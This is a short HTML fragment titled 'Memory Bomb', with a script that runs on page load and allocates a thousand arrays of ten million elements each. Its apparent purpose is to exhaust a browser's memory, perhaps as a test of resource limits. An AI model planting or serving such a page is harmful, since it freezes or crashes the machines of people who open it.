</head>
<body>
    <h1>Memory Bomb - Allocating massive arrays</h1>
    <script>
        // Allocate huge amounts of memory
        const arrays = [];
        for(let i = 0; i < 1000; i++) {
            arrays.push(new Array(10000000).fill('X'.repeat(1000)));
        }
    </script>
